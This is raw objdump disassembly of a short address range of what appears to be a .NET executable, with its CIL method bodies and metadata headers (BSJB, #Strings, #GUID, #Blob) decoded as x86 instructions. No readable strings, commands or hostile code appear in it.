  4025bf:	00 01                	add    %al,(%ecx)
  4025c1:	34 00                	xor    $0x0,%al
  4025c3:	00 00                	add    %al,(%eax)
  4025c5:	00 44 00 27          	add    %al,0x27(%eax,%eax,1)
  4025c9:	6b 00 1f             	imul   $0x1f,(%eax),%eax
  4025cc:	10 00                	adc    %al,(%eax)
  4025ce:	00 01                	add    %al,(%ecx)
  4025d0:	02 00                	add    (%eax),%al
  4025d2:	df 00                	filds  (%eax)
  4025d4:	2b 0a                	sub    (%edx),%ecx
  4025d6:	01 0e                	add    %ecx,(%esi)
  4025d8:	00 00                	add    %al,(%eax)
  4025da:	00 00                	add    %al,(%eax)
  4025dc:	02 00                	add    (%eax),%al
  4025de:	4c                   	dec    %esp
  4025df:	01 2b                	add    %ebp,(%ebx)
  4025e1:	77 01                	ja     0x4025e4
  4025e3:	0e                   	push   %cs
  4025e4:	00 00                	add    %al,(%eax)
  4025e6:	00 00                	add    %al,(%eax)
  4025e8:	02 00                	add    (%eax),%al
  4025ea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4025eb:	01 2b                	add    %ebp,(%ebx)
  4025ed:	cf                   	iret
  4025ee:	01 0e                	add    %ecx,(%esi)
  4025f0:	00 00                	add    %al,(%eax)
  4025f2:	00 00                	add    %al,(%eax)
  4025f4:	1b 30                	sbb    (%eax),%esi
  4025f6:	03 00                	add    (%eax),%eax
  4025f8:	9c                   	pushf
  4025f9:	00 00                	add    %al,(%eax)
  4025fb:	00 06                	add    %al,(%esi)
  4025fd:	00 00                	add    %al,(%eax)
  4025ff:	11 73 11             	adc    %esi,0x11(%ebx)
  402602:	00 00                	add    %al,(%eax)
  402604:	06                   	push   %es
  402605:	0a 06                	or     (%esi),%al
  402607:	03 7d 19             	add    0x19(%ebp),%edi
  40260a:	00 00                	add    %al,(%eax)
  40260c:	04 73                	add    $0x73,%al
  40260e:	45                   	inc    %ebp
  40260f:	00 00                	add    %al,(%eax)
  402611:	0a 0b                	or     (%ebx),%cl
  402613:	02 6f 24             	add    0x24(%edi),%ch
  402616:	00 00                	add    %al,(%eax)
  402618:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  40261b:	37                   	aaa
  40261c:	73 12                	jae    0x402630
  40261e:	00 00                	add    %al,(%eax)
  402620:	06                   	push   %es
  402621:	25 06 7d 1b 00       	and    $0x1b7d06,%eax
  402626:	00 04 25 12 02 28 25 	add    %al,0x25280212(,%eiz,1)
  40262d:	00 00                	add    %al,(%eax)
  40262f:	0a 7d 1a             	or     0x1a(%ebp),%bh
  402632:	00 00                	add    %al,(%eax)
  402634:	04 fe                	add    $0xfe,%al
  402636:	06                   	push   %es
  402637:	13 00                	adc    (%eax),%eax
  402639:	00 06                	add    %al,(%esi)
  40263b:	73 46                	jae    0x402683
  40263d:	00 00                	add    %al,(%eax)
  40263f:	0a 73 47             	or     0x47(%ebx),%dh
  402642:	00 00                	add    %al,(%eax)
  402644:	0a 0d 09 6f 48 00    	or     0x486f09,%cl
  40264a:	00 0a                	add    %cl,(%edx)
  40264c:	07                   	pop    %es
  40264d:	09 6f 49             	or     %ebp,0x49(%edi)
  402650:	00 00                	add    %al,(%eax)
  402652:	0a 12                	or     (%edx),%dl
  402654:	02 28                	add    (%eax),%ch
  402656:	2a 00                	sub    (%eax),%al
  402658:	00 0a                	add    %cl,(%edx)
  40265a:	2d c0 de 0e 12       	sub    $0x120edec0,%eax
  40265f:	02 fe                	add    %dh,%bh
  402661:	16                   	push   %ss
  402662:	04 00                	add    $0x0,%al
  402664:	00 1b                	add    %bl,(%ebx)
  402666:	6f                   	outsl  %ds:(%esi),(%dx)
  402667:	23 00                	and    (%eax),%eax
  402669:	00 0a                	add    %cl,(%edx)
  40266b:	dc 07                	faddl  (%edi)
  40266d:	6f                   	outsl  %ds:(%esi),(%dx)
  40266e:	4a                   	dec    %edx
  40266f:	00 00                	add    %al,(%eax)
  402671:	0a 13                	or     (%ebx),%dl
  402673:	04 2b                	add    $0x2b,%al
  402675:	0c 12                	or     $0x12,%al
  402677:	04 28                	add    $0x28,%al
  402679:	4b                   	dec    %ebx
  40267a:	00 00                	add    %al,(%eax)
  40267c:	0a 6f 4c             	or     0x4c(%edi),%ch
  40267f:	00 00                	add    %al,(%eax)
  402681:	0a 12                	or     (%edx),%dl
  402683:	04 28                	add    $0x28,%al
  402685:	4d                   	dec    %ebp
  402686:	00 00                	add    %al,(%eax)
  402688:	0a 2d eb de 0e 12    	or     0x120edeeb,%ch
  40268e:	04 fe                	add    $0xfe,%al
  402690:	16                   	push   %ss
  402691:	06                   	push   %es
  402692:	00 00                	add    %al,(%eax)
  402694:	1b 6f 23             	sbb    0x23(%edi),%ebp
  402697:	00 00                	add    %al,(%eax)
  402699:	0a dc                	or     %ah,%bl
  40269b:	2a 01                	sub    (%ecx),%al
  40269d:	1c 00                	sbb    $0x0,%al
  40269f:	00 02                	add    %al,(%edx)
  4026a1:	00 1a                	add    %bl,(%edx)
  4026a3:	00 44 5e 00          	add    %al,0x0(%esi,%ebx,2)
  4026a7:	0e                   	push   %cs
  4026a8:	00 00                	add    %al,(%eax)
  4026aa:	00 00                	add    %al,(%eax)
  4026ac:	02 00                	add    (%eax),%al
  4026ae:	74 00                	je     0x4026b0
  4026b0:	19 8d 00 0e 00 00    	sbb    %ecx,0xe00(%ebp)
  4026b6:	00 00                	add    %al,(%eax)
  4026b8:	1b 30                	sbb    (%eax),%esi
  4026ba:	03 00                	add    (%eax),%eax
  4026bc:	d2 00                	rolb   %cl,(%eax)
  4026be:	00 00                	add    %al,(%eax)
  4026c0:	07                   	pop    %es
  4026c1:	00 00                	add    %al,(%eax)
  4026c3:	11 02                	adc    %eax,(%edx)
  4026c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4026c6:	24 00                	and    $0x0,%al
  4026c8:	00 0a                	add    %cl,(%edx)
  4026ca:	0a 38                	or     (%eax),%bh
  4026cc:	a9 00 00 00 12       	test   $0x12000000,%eax
  4026d1:	00 28                	add    %ch,(%eax)
  4026d3:	25 00 00 0a 0b       	and    $0xb0a0000,%eax
  4026d8:	72 bf                	jb     0x402699
  4026da:	01 00                	add    %eax,(%eax)
  4026dc:	70 07                	jo     0x4026e5
  4026de:	28 4e 00             	sub    %cl,0x0(%esi)
  4026e1:	00 0a                	add    %cl,(%edx)
  4026e3:	72 db                	jb     0x4026c0
  4026e5:	01 00                	add    %eax,(%eax)
  4026e7:	70 07                	jo     0x4026f0
  4026e9:	28 31                	sub    %dh,(%ecx)
  4026eb:	00 00                	add    %al,(%eax)
  4026ed:	0a 25 28 40 00 00    	or     0x4028,%ah
  4026f3:	0a 1f                	or     (%edi),%bl
  4026f5:	64 12 02             	adc    %fs:(%edx),%al
  4026f8:	28 03                	sub    %al,(%ebx)
  4026fa:	00 00                	add    %al,(%eax)
  4026fc:	06                   	push   %es
  4026fd:	d0 03                	rolb   $1,(%ebx)
  4026ff:	00 00                	add    %al,(%eax)
  402701:	02 28                	add    (%eax),%ch
  402703:	11 00                	adc    %eax,(%eax)
  402705:	00 0a                	add    %cl,(%edx)
  402707:	28 12                	sub    %dl,(%edx)
  402709:	00 00                	add    %al,(%eax)
  40270b:	0a 26                	or     (%esi),%ah
  40270d:	72 e7                	jb     0x4026f6
  40270f:	01 00                	add    %eax,(%eax)
  402711:	70 28                	jo     0x40273b
  402713:	40                   	inc    %eax
  402714:	00 00                	add    %al,(%eax)
  402716:	0a 25 28 4f 00 00    	or     0x4f28,%ah
  40271c:	0a 2d 5a 08 d0 03    	or     0x3d0085a,%ch
  402722:	00 00                	add    %al,(%eax)
  402724:	02 28                	add    (%eax),%ch
  402726:	11 00                	adc    %eax,(%eax)
  402728:	00 0a                	add    %cl,(%edx)
  40272a:	28 15 00 00 0a a5    	sub    %dl,0xa50a0000
  402730:	03 00                	add    (%eax),%eax
  402732:	00 02                	add    %al,(%edx)
  402734:	0d 09 7b 05 00       	or     $0x57b09,%eax
  402739:	00 04 28             	add    %al,(%eax,%ebp,1)
  40273c:	50                   	push   %eax
  40273d:	00 00                	add    %al,(%eax)
  40273f:	0a 2d 37 09 7b 05    	or     0x57b0937,%ch
  402745:	00 00                	add    %al,(%eax)
  402747:	04 28                	add    $0x28,%al
  402749:	40                   	inc    %eax
  40274a:	00 00                	add    %al,(%eax)
  40274c:	0a 09                	or     (%ecx),%cl
  40274e:	7b 04                	jnp    0x402754
  402750:	00 00                	add    %al,(%eax)
  402752:	04 28                	add    $0x28,%al
  402754:	4f                   	dec    %edi
  402755:	00 00                	add    %al,(%eax)
  402757:	0a 09                	or     (%ecx),%cl
  402759:	7b 07                	jnp    0x402762
  40275b:	00 00                	add    %al,(%eax)
  40275d:	04 28                	add    $0x28,%al
  40275f:	4f                   	dec    %edi
  402760:	00 00                	add    %al,(%eax)
  402762:	0a 09                	or     (%ecx),%cl
  402764:	7b 08                	jnp    0x40276e
  402766:	00 00                	add    %al,(%eax)
  402768:	04 28                	add    $0x28,%al
  40276a:	4f                   	dec    %edi
  40276b:	00 00                	add    %al,(%eax)
  40276d:	0a 09                	or     (%ecx),%cl
  40276f:	7b 06                	jnp    0x402777
  402771:	00 00                	add    %al,(%eax)
  402773:	04 28                	add    $0x28,%al
  402775:	40                   	inc    %eax
  402776:	00 00                	add    %al,(%eax)
  402778:	0a 12                	or     (%edx),%dl
  40277a:	00 28                	add    %ch,(%eax)
  40277c:	2a 00                	sub    (%eax),%al
  40277e:	00 0a                	add    %cl,(%edx)
  402780:	3a 4b ff             	cmp    -0x1(%ebx),%cl
  402783:	ff                   	(bad)
  402784:	ff                   	lcall  (bad)
  402785:	de 0e                	fimuls (%esi)
  402787:	12 00                	adc    (%eax),%al
  402789:	fe                   	(bad)
  40278a:	16                   	push   %ss
  40278b:	04 00                	add    $0x0,%al
  40278d:	00 1b                	add    %bl,(%ebx)
  40278f:	6f                   	outsl  %ds:(%esi),(%dx)
  402790:	23 00                	and    (%eax),%eax
  402792:	00 0a                	add    %cl,(%edx)
  402794:	dc 2a                	fsubrl (%edx)
  402796:	00 00                	add    %al,(%eax)
  402798:	01 10                	add    %edx,(%eax)
  40279a:	00 00                	add    %al,(%eax)
  40279c:	02 00                	add    (%eax),%al
  40279e:	07                   	pop    %es
  40279f:	00 bc c3 00 0e 00 00 	add    %bh,0xe00(%ebx,%eax,8)
  4027a6:	00 00                	add    %al,(%eax)
  4027a8:	13 30                	adc    (%eax),%esi
  4027aa:	04 00                	add    $0x0,%al
  4027ac:	c7 00 00 00 08 00    	movl   $0x80000,(%eax)
  4027b2:	00 11                	add    %dl,(%ecx)
  4027b4:	28 09                	sub    %cl,(%ecx)
  4027b6:	00 00                	add    %al,(%eax)
  4027b8:	06                   	push   %es
  4027b9:	0a 72 f7             	or     -0x9(%edx),%dh
  4027bc:	01 00                	add    %eax,(%eax)
  4027be:	70 06                	jo     0x4027c6
  4027c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4027c1:	44                   	inc    %esp
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	0a 8c 25 00 00 01 28 	or     0x28010000(%ebp,%eiz,1),%cl
  4027cb:	4e                   	dec    %esi
  4027cc:	00 00                	add    %al,(%eax)
  4027ce:	0a 1f                	or     (%edi),%bl
  4027d0:	0a 1f                	or     (%edi),%bl
  4027d2:	0a 28                	or     (%eax),%ch
  4027d4:	51                   	push   %ecx
  4027d5:	00 00                	add    %al,(%eax)
  4027d7:	0a 26                	or     (%esi),%ah
  4027d9:	02 72 39             	add    0x39(%edx),%dh
  4027dc:	02 00                	add    (%eax),%al
  4027de:	70 28                	jo     0x402808
  4027e0:	01 00                	add    %eax,(%eax)
  4027e2:	00 2b                	add    %ch,(%ebx)
  4027e4:	2c 07                	sub    $0x7,%al
  4027e6:	06                   	push   %es
  4027e7:	28 08                	sub    %cl,(%eax)
  4027e9:	00 00                	add    %al,(%eax)
  4027eb:	06                   	push   %es
  4027ec:	2a 02                	sub    (%edx),%al
  4027ee:	72 41                	jb     0x402831
  4027f0:	02 00                	add    (%eax),%al
  4027f2:	70 28                	jo     0x40281c
  4027f4:	01 00                	add    %eax,(%eax)
  4027f6:	00 2b                	add    %ch,(%ebx)
  4027f8:	2c 62                	sub    $0x62,%al
  4027fa:	16                   	push   %ss
  4027fb:	0b 02                	or     (%edx),%eax
  4027fd:	72 4f                	jb     0x40284e
  4027ff:	02 00                	add    (%eax),%al
  402801:	70 28                	jo     0x40282b
  402803:	01 00                	add    %eax,(%eax)
  402805:	00 2b                	add    %ch,(%ebx)
  402807:	2c 02                	sub    $0x2,%al
  402809:	17                   	pop    %ss
  40280a:	0b 02                	or     (%edx),%eax
  40280c:	8e 69 18             	mov    0x18(%ecx),%gs
  40280f:	32 0a                	xor    (%edx),%cl
  402811:	02 8e 69 18 fe 01    	add    0x1fe1869(%esi),%cl
  402817:	07                   	pop    %es
  402818:	5f                   	pop    %edi
  402819:	2c 08                	sub    $0x8,%al
  40281b:	06                   	push   %es
  40281c:	07                   	pop    %es
  40281d:	28 0b                	sub    %cl,(%ebx)
  40281f:	00 00                	add    %al,(%eax)
  402821:	06                   	push   %es
  402822:	2a 02                	sub    (%edx),%al
  402824:	17                   	pop    %ss
  402825:	9a 72 4f 02 00 70 28 	lcall  $0x2870,$0x24f72
  40282c:	52                   	push   %edx
  40282d:	00 00                	add    %al,(%eax)
  40282f:	0a 2c 08             	or     (%eax,%ecx,1),%ch
  402832:	06                   	push   %es
  402833:	17                   	pop    %ss
  402834:	28 0b                	sub    %cl,(%ebx)
  402836:	00 00                	add    %al,(%eax)
  402838:	06                   	push   %es
  402839:	2a 72 6b             	sub    0x6b(%edx),%dh
  40283c:	02 00                	add    (%eax),%al
  40283e:	70 02                	jo     0x402842
  402840:	17                   	pop    %ss
  402841:	9a 28 4e 00 00 0a 73 	lcall  $0x730a,$0x4e28
  402848:	2b 00                	sub    (%eax),%eax
  40284a:	00 0a                	add    %cl,(%edx)
  40284c:	25 02 17 9a 6f       	and    $0x6f9a1702,%eax
  402851:	3f                   	aas
  402852:	00 00                	add    %al,(%eax)
  402854:	0a 07                	or     (%edi),%al
  402856:	28 0b                	sub    %cl,(%ebx)
  402858:	00 00                	add    %al,(%eax)
  40285a:	06                   	push   %es
  40285b:	2a 02                	sub    (%edx),%al
  40285d:	72 bb                	jb     0x40281a
  40285f:	02 00                	add    (%eax),%al
  402861:	70 28                	jo     0x40288b
  402863:	01 00                	add    %eax,(%eax)
  402865:	00 2b                	add    %ch,(%ebx)
  402867:	2c 07                	sub    $0x7,%al
  402869:	06                   	push   %es
  40286a:	28 0c 00             	sub    %cl,(%eax,%eax,1)
  40286d:	00 06                	add    %al,(%esi)
  40286f:	2a 72 cd             	sub    -0x33(%edx),%dh
  402872:	02 00                	add    (%eax),%al
  402874:	70 28                	jo     0x40289e
  402876:	40                   	inc    %eax
  402877:	00 00                	add    %al,(%eax)
  402879:	0a 2a                	or     (%edx),%ch
  40287b:	1e                   	push   %ds
  40287c:	02 28                	add    (%eax),%ch
  40287e:	53                   	push   %ebx
  40287f:	00 00                	add    %al,(%eax)
  402881:	0a 2a                	or     (%edx),%ch
  402883:	5a                   	pop    %edx
  402884:	02 03                	add    (%ebx),%al
  402886:	7d 0a                	jge    0x402892
  402888:	00 00                	add    %al,(%eax)
  40288a:	04 02                	add    $0x2,%al
  40288c:	04 7d                	add    $0x7d,%al
  40288e:	0b 00                	or     (%eax),%eax
  402890:	00 04 02             	add    %al,(%edx,%eax,1)
  402893:	05 7d 0c 00 00       	add    $0xc7d,%eax
  402898:	04 2a                	add    $0x2a,%al
  40289a:	1e                   	push   %ds
  40289b:	02 7b 0a             	add    0xa(%ebx),%bh
  40289e:	00 00                	add    %al,(%eax)
  4028a0:	04 2a                	add    $0x2a,%al
  4028a2:	1e                   	push   %ds
  4028a3:	02 28                	add    (%eax),%ch
  4028a5:	53                   	push   %ebx
  4028a6:	00 00                	add    %al,(%eax)
  4028a8:	0a 2a                	or     (%edx),%ch
  4028aa:	1e                   	push   %ds
  4028ab:	02 28                	add    (%eax),%ch
  4028ad:	53                   	push   %ebx
  4028ae:	00 00                	add    %al,(%eax)
  4028b0:	0a 2a                	or     (%edx),%ch
  4028b2:	5e                   	pop    %esi
  4028b3:	02 7b 1a             	add    0x1a(%ebx),%bh
  4028b6:	00 00                	add    %al,(%eax)
  4028b8:	04 02                	add    $0x2,%al
  4028ba:	7b 1b                	jnp    0x4028d7
  4028bc:	00 00                	add    %al,(%eax)
  4028be:	04 7b                	add    $0x7b,%al
  4028c0:	19 00                	sbb    %eax,(%eax)
  4028c2:	00 04 28             	add    %al,(%eax,%ebp,1)
  4028c5:	0a 00                	or     (%eax),%al
  4028c7:	00 06                	add    %al,(%esi)
  4028c9:	2a 00                	sub    (%eax),%al
  4028cb:	00 42 53             	add    %al,0x53(%edx)
  4028ce:	4a                   	dec    %edx
  4028cf:	42                   	inc    %edx
  4028d0:	01 00                	add    %eax,(%eax)
  4028d2:	01 00                	add    %eax,(%eax)
  4028d4:	00 00                	add    %al,(%eax)
  4028d6:	00 00                	add    %al,(%eax)
  4028d8:	0c 00                	or     $0x0,%al
  4028da:	00 00                	add    %al,(%eax)
  4028dc:	76 34                	jbe    0x402912
  4028de:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4028e1:	33 30                	xor    (%eax),%esi
  4028e3:	33 31                	xor    (%ecx),%esi
  4028e5:	39 00                	cmp    %eax,(%eax)
  4028e7:	00 00                	add    %al,(%eax)
  4028e9:	00 05 00 6c 00 00    	add    %al,0x6c00
  4028ef:	00 f8                	add    %bh,%al
  4028f1:	07                   	pop    %es
  4028f2:	00 00                	add    %al,(%eax)
  4028f4:	23 7e 00             	and    0x0(%esi),%edi
  4028f7:	00 64 08 00          	add    %ah,0x0(%eax,%ecx,1)
  4028fb:	00 b0 09 00 00 23    	add    %dh,0x23000009(%eax)
  402901:	53                   	push   %ebx
  402902:	74 72                	je     0x402976
  402904:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  40290b:	00 14 12             	add    %dl,(%edx,%edx,1)
  40290e:	00 00                	add    %al,(%eax)
  402910:	48                   	dec    %eax
  402911:	03 00                	add    (%eax),%eax
  402913:	00 23                	add    %ah,(%ebx)
  402915:	55                   	push   %ebp
  402916:	53                   	push   %ebx
  402917:	00 5c 15 00          	add    %bl,0x0(%ebp,%edx,1)
  40291b:	00 10                	add    %dl,(%eax)
  40291d:	00 00                	add    %al,(%eax)
  40291f:	00 23                	add    %ah,(%ebx)
  402921:	47                   	inc    %edi
  402922:	55                   	push   %ebp
  402923:	49                   	dec    %ecx
  402924:	44                   	inc    %esp
  402925:	00 00                	add    %al,(%eax)
  402927:	00 6c 15 00          	add    %ch,0x0(%ebp,%edx,1)
  40292b:	00 8c 03 00 00 23 42 	add    %cl,0x42230000(%ebx,%eax,1)
  402932:	6c                   	insb   (%dx),%es:(%edi)
  402933:	6f                   	outsl  %ds:(%esi),(%dx)
  402934:	62 00                	bound  %eax,(%eax)
  402936:	00 00                	add    %al,(%eax)
  402938:	00 00                	add    %al,(%eax)
  40293a:	00 00                	add    %al,(%eax)
  40293c:	02 00                	add    (%eax),%al
  40293e:	00 01                	add    %al,(%ecx)
  402940:	57                   	push   %edi
  402941:	1d a2 1d 09 0a       	sbb    $0xa091da2,%eax
  402946:	00 00                	add    %al,(%eax)
  402948:	00 fa                	add    %bh,%dl
  40294a:	01 33                	add    %esi,(%ebx)
  40294c:	00 16                	add    %dl,(%esi)
  40294e:	00 00                	add    %al,(%eax)
  402950:	01 00                	add    %eax,(%eax)
  402952:	00 00                	add    %al,(%eax)
  402954:	36 00 00             	add    %al,%ss:(%eax)
  402957:	00 09                	add    %cl,(%ecx)
  402959:	00 00                	add    %al,(%eax)
  40295b:	00 1b                	add    %bl,(%ebx)
  40295d:	00 00                	add    %al,(%eax)
  40295f:	00 13                	add    %dl,(%ebx)
  402961:	00 00                	add    %al,(%eax)
  402963:	00 17                	add    %dl,(%edi)
  402965:	00 00                	add    %al,(%eax)
  402967:	00 53 00             	add    %dl,0x0(%ebx)
  40296a:	00 00                	add    %al,(%eax)
  40296c:	0e                   	push   %cs
  40296d:	00 00                	add    %al,(%eax)
  40296f:	00 13                	add    %dl,(%ebx)
  402971:	00 00                	add    %al,(%eax)
  402973:	00 08                	add    %cl,(%eax)
  402975:	00 00                	add    %al,(%eax)
  402977:	00 01                	add    %al,(%ecx)
  402979:	00 00                	add    %al,(%eax)
  40297b:	00 01                	add    %al,(%ecx)
  40297d:	00 00                	add    %al,(%eax)
  40297f:	00 02                	add    %al,(%edx)
  402981:	00 00                	add    %al,(%eax)
  402983:	00 01                	add    %al,(%ecx)
  402985:	00 00                	add    %al,(%eax)
  402987:	00 06                	add    %al,(%esi)
  402989:	00 00                	add    %al,(%eax)
  40298b:	00 03                	add    %al,(%ebx)
  40298d:	00 00                	add    %al,(%eax)
  40298f:	00 01                	add    %al,(%ecx)
  402991:	00 00                	add    %al,(%eax)
  402993:	00 04 00             	add    %al,(%eax,%eax,1)
  402996:	00 00                	add    %al,(%eax)
  402998:	07                   	pop    %es
  402999:	00 00                	add    %al,(%eax)
  40299b:	00 01                	add    %al,(%ecx)
  40299d:	00 00                	add    %al,(%eax)
  40299f:	00 00                	add    %al,(%eax)
  4029a1:	00 6a 04             	add    %ch,0x4(%edx)
  4029a4:	01 00                	add    %eax,(%eax)
  4029a6:	00 00                	add    %al,(%eax)
  4029a8:	00 00                	add    %al,(%eax)
  4029aa:	06                   	push   %es
  4029ab:	00 d9                	add    %bl,%cl
  4029ad:	03 5a 07             	add    0x7(%edx),%ebx
  4029b0:	06                   	push   %es
  4029b1:	00 46 04             	add    %al,0x4(%esi)
  4029b4:	5a                   	pop    %edx
  4029b5:	07                   	pop    %es
  4029b6:	06                   	push   %es
  4029b7:	00 0d 03 fc 06 0f    	add    %cl,0xf06fc03
  4029bd:	00 93 07 00 00 06    	add    %dl,0x6000007(%ebx)
  4029c3:	00 35 03 72 05 06    	add    %dh,0x6057203
  4029c9:	00 bc 03 72 05 06 00 	add    %bh,0x60572(%ebx,%eax,1)
  4029d0:	9d                   	popf
  4029d1:	03 72 05             	add    0x5(%edx),%esi
  4029d4:	06                   	push   %es
  4029d5:	00 2d 04 72 05 06    	add    %ch,0x6057204
  4029db:	00 f9                	add    %bh,%cl
  4029dd:	03 72 05             	add    0x5(%edx),%esi
  4029e0:	06                   	push   %es
  4029e1:	00 12                	add    %dl,(%edx)
  4029e3:	04 72                	add    $0x72,%al
  4029e5:	05 06 00 4c 03       	add    $0x34c0006,%eax
  4029ea:	72 05                	jb     0x4029f1
  4029ec:	06                   	push   %es
  4029ed:	00 21                	add    %ah,(%ecx)
  4029ef:	03 3b                	add    (%ebx),%edi
  4029f1:	07                   	pop    %es
  4029f2:	06                   	push   %es
  4029f3:	00 ff                	add    %bh,%bh
  4029f5:	02 3b                	add    (%ebx),%bh
  4029f7:	07                   	pop    %es
  4029f8:	06                   	push   %es
  4029f9:	00 80 03 72 05 06    	add    %al,0x6057203(%eax)
  4029ff:	00 67 03             	add    %ah,0x3(%edi)
  402a02:	9f                   	lahf
  402a03:	04 06                	add    $0x6,%al
  402a05:	00 c6                	add    %al,%dh
  402a07:	08 38                	or     %bh,(%eax)
  402a09:	05 06 00 e4 02       	add    $0x2e40006,%eax
  402a0e:	5a                   	pop    %edx
  402a0f:	07                   	pop    %es
  402a10:	0a 00                	or     (%eax),%al
  402a12:	ac                   	lods   %ds:(%esi),%al
  402a13:	02 8e 04 06 00 44    	add    0x44000604(%esi),%cl
  402a19:	06                   	push   %es
  402a1a:	2f                   	das
  402a1b:	09 06                	or     %eax,(%esi)
  402a1d:	00 77 00             	add    %dh,0x0(%edi)
  402a20:	23 01                	and    (%ecx),%eax
  402a22:	0e                   	push   %cs
  402a23:	00 6b 06             	add    %ch,0x6(%ebx)
  402a26:	4e                   	dec    %esi
  402a27:	09 06                	or     %eax,(%esi)
  402a29:	00 c7                	add    %al,%bh
  402a2b:	06                   	push   %es
  402a2c:	4c                   	dec    %esp
  402a2d:	08 06                	or     %al,(%esi)
  402a2f:	00 cd                	add    %cl,%ch
  402a31:	01 38                	add    %edi,(%eax)
  402a33:	05 53 00 d6 06       	add    $0x6d60053,%eax
  402a38:	00 00                	add    %al,(%eax)
  402a3a:	0a 00                	or     (%eax),%al
  402a3c:	ae                   	scas   %es:(%edi),%al
  402a3d:	08 cd                	or     %cl,%ch
  402a3f:	08 06                	or     %al,(%esi)
  402a41:	00 0a                	add    %cl,(%edx)
  402a43:	06                   	push   %es
  402a44:	38 05 0e 00 77 09    	cmp    %al,0x977000e
  402a4a:	7a 07                	jp     0x402a53
  402a4c:	0e                   	push   %cs
  402a4d:	00 59 06             	add    %bl,0x6(%ecx)
  402a50:	7a 07                	jp     0x402a59
  402a52:	0e                   	push   %cs
  402a53:	00 ec                	add    %ch,%ah
  402a55:	08 7a 07             	or     %bh,0x7(%edx)
  402a58:	06                   	push   %es
  402a59:	00 3e                	add    %bh,(%esi)
  402a5b:	01 8e 04 06 00 6e    	add    %ecx,0x6e000604(%esi)
  402a61:	02 38                	add    (%eax),%bh
  402a63:	05 06 00 47 05       	add    $0x5470006,%eax
  402a68:	38 05 06 00 73 02    	cmp    %al,0x2730006
  402a6e:	38 05 06 00 d9 01    	cmp    %al,0x1d90006
  402a74:	38 05 06 00 ce 04    	cmp    %al,0x4ce0006
  402a7a:	3b 07                	cmp    (%edi),%eax
  402a7c:	06                   	push   %es
  402a7d:	00 ee                	add    %ch,%dh
  402a7f:	06                   	push   %es
  402a80:	38 05 06 00 8e 00    	cmp    %al,0x8e0006
  402a86:	38 05 06 00 bb 04    	cmp    %al,0x4bb0006
  402a8c:	38 05 0e 00 66 05    	cmp    %al,0x566000e
  402a92:	4e                   	dec    %esi
  402a93:	09 0e                	or     %ecx,(%esi)
  402a95:	00 b3 05 4e 09 06    	add    %dh,0x6094e05(%ebx)
  402a9b:	00 c5                	add    %al,%ch
  402a9d:	02 4c 08 0a          	add    0xa(%eax,%ecx,1),%cl
  402aa1:	00 2b                	add    %ch,(%ebx)
  402aa3:	08 cd                	or     %cl,%ch
  402aa5:	08 06                	or     %al,(%esi)
  402aa7:	00 0b                	add    %cl,(%ebx)
  402aa9:	02 38                	add    (%eax),%bh
  402aab:	05 06 00 92 09       	add    $0x9920006,%eax
  402ab0:	d6                   	salc
  402ab1:	04 06                	add    $0x6,%al
  402ab3:	00 3f                	add    %bh,(%edi)
  402ab5:	06                   	push   %es
  402ab6:	38 05 0a 00 a2 05    	cmp    %al,0x5a2000a
  402abc:	6a 01                	push   $0x1
  402abe:	0e                   	push   %cs
  402abf:	00 ce                	add    %cl,%dh
  402ac1:	05 7a 07 0e 00       	add    $0xe077a,%eax
  402ac6:	e5 05                	in     $0x5,%eax
  402ac8:	7a 07                	jp     0x402ad1
  402aca:	0e                   	push   %cs
  402acb:	00 84 05 7a 07 06 00 	add    %al,0x6077a(%ebp,%eax,1)
  402ad2:	6d                   	insl   (%dx),%es:(%edi)
  402ad3:	09 fb                	or     %edi,%ebx
  402ad5:	00 12                	add    %dl,(%edx)
  402ad7:	00 c2                	add    %al,%dl
  402ad9:	01 33                	add    %esi,(%ebx)
  402adb:	06                   	push   %es
  402adc:	06                   	push   %es
  402add:	00 69 00             	add    %ch,0x0(%ecx)
  402ae0:	23 01                	and    (%ecx),%eax
  402ae2:	06                   	push   %es
  402ae3:	00 1a                	add    %bl,(%edx)
  402ae5:	09 8e 04 06 00 1c    	or     %ecx,0x1c000604(%esi)
  402aeb:	05 8e 04 00 00       	add    $0x48e,%eax
  402af0:	00 00                	add    %al,(%eax)
  402af2:	94                   	xchg   %eax,%esp
  402af3:	00 00                	add    %al,(%eax)
  402af5:	00 00                	add    %al,(%eax)
  402af7:	00 01                	add    %al,(%ecx)
  402af9:	00 01                	add    %al,(%ecx)
  402afb:	00 00                	add    %al,(%eax)
  402afd:	00 10                	add    %dl,(%eax)
  402aff:	00 27                	add    %ah,(%edi)
  402b01:	05 d4 07 41 00       	add    $0x4107d4,%eax
  402b06:	01 00                	add    %eax,(%eax)
  402b08:	01 00                	add    %eax,(%eax)
  402b0a:	0a 01                	or     (%ecx),%al
  402b0c:	11 00                	adc    %eax,(%eax)
  402b0e:	01 00                	add    %eax,(%eax)
  402b10:	00 00                	add    %al,(%eax)
  402b12:	7d 00                	jge    0x402b14
  402b14:	04 00                	add    $0x0,%al
  402b16:	0f 00 0a             	str    (%edx)
  402b19:	01 11                	add    %edx,(%ecx)
  402b1b:	00 26                	add    %ah,(%esi)
  402b1d:	00 00                	add    %al,(%eax)
  402b1f:	00 7d 00             	add    %bh,0x0(%ebp)
  402b22:	09 00                	or     %eax,(%eax)
  402b24:	0f 00 0a             	str    (%edx)
  402b27:	01 11                	add    %edx,(%ecx)
  402b29:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402b2d:	00 7d 00             	add    %bh,0x0(%ebp)
  402b30:	0a 00                	or     (%eax),%al
  402b32:	0f 00 03             	sldt   (%ebx)
  402b35:	01 00                	add    %eax,(%eax)
  402b37:	00 be 06 00 00 81    	add    %bh,-0x7efffffa(%esi)
  402b3d:	00 0d 00 11 00 03    	add    %cl,0x3001100
  402b43:	01 00                	add    %eax,(%eax)
  402b45:	00 c3                	add    %al,%bl
  402b47:	00 00                	add    %al,(%eax)
  402b49:	00 81 00 13 00 11    	add    %al,0x11001300(%ecx)
  402b4f:	00 03                	add    %al,(%ebx)
  402b51:	01 10                	add    %edx,(%eax)
  402b53:	00 10                	add    %dl,(%eax)
  402b55:	00 00                	add    %al,(%eax)
  402b57:	00 41 00             	add    %al,0x0(%ecx)
